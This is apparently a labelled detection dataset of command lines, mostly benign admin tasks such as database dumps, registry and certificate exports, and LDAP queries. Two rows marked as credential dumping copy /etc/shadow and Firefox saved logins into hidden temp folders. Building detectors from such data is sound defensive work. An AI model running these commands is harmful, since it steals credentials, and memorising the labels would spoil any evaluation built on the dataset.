process_name,command_line,label,attack_type
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-2.36.8.reg /y,benign,benign
certutil.exe,certutil.exe -store My 1ef0f55b791d3ce4bb8e85e63dc841bf,benign,benign
ssh,ssh -tt -i /etc/ci/deploy_key sysadmin@app06.corp.local 'sudo systemctl restart payroll',benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-8.13.5.reg /y,benign,benign
pg_dump,pg_dump -h 10.24.35.55 -U ansible -Fc -f /srv/backups/db/dataset_part-1.21.9.dump --no-password customers,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:871df913acc49147c677eb4f2cc61b96,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:693dfe7c7830fcaa2ab5f87f97e42417,benign,benign
cat,cat /etc/shadow > /tmp/.2bc73e93c9877ed8/sh.txt,malicious,credential_dumping
pg_dump,pg_dump -h 10.30.200.158 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-9.26.5.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\telemetry_batch C:\Backups\reg\telemetry_batch-2.11.4.reg /y,benign,benign
certutil.exe,certutil.exe -store My f2116ac93be7f970fc8ee527cc37ab89,benign,benign
ldapsearch,"ldapsearch -x -H ldap://db10.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u ops -p$DB_PASS billing > /srv/backups/audit_trail.sql,benign,benign
pg_dump,pg_dump -h 10.39.141.197 -U root -Fc -f /srv/backups/db/ledger_2024-8.14.2.dump --no-password customers,benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u admin -p$DB_PASS billing > /srv/backups/ledger_2024.sql,benign,benign
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e5355c45c507b05b -FilePath C:\Backups\certs\audit_trail.cer,benign,benign
cp,cp /home/postgres/.mozilla/firefox/*.default-release/logins.json /tmp/.9f03bd07fb81789a/,malicious,credential_dumping
mysqldump,mysqldump --single-transaction --routines --triggers -u mssql -p$DB_PASS billing > /srv/backups/archive_set.sql,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\snapshot C:\Backups\reg\snapshot-1.8.3.reg /y,benign,benign
kubectl,kubectl get secret archive_set-tls -n production -o yaml > /srv/backups/k8s/archive_set-secret.yaml,benign,benign
ssh,ssh -N -L 8080:localhost:5432 ops@node04.ad.example.com,benign,benign
docker,docker exec -it snapshot-3ce17a428c81732668fc510497f4a53f /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
aws,aws secretsmanager get-secret-value --secret-id prod/payroll/api --query SecretString --output text --profile ci,benign,benign
expect,expect -f /opt/automation/rotate-router-cache07.exp,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:54bab0829d2362da,benign,benign
ldapsearch,"ldapsearch -x -H ldap://cache06.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
ldapsearch,"ldapsearch -x -H ldap://db07.corp.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
